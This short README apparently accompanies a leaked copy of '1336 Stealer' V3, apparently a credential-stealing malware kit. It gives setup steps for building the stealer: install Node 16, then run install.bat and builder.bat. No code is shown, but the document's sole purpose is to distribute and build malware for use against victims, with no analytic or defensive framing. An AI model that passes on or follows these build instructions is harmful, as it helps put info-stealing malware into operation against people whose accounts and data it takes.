# 1336-V3
Leak of the V3 of 1336 Stealer

Download [Windows 64-bit Installer](https://nodejs.org/en/blog/release/v16.16.0) of Node 16

Launch install.bat
Launch builder.bat
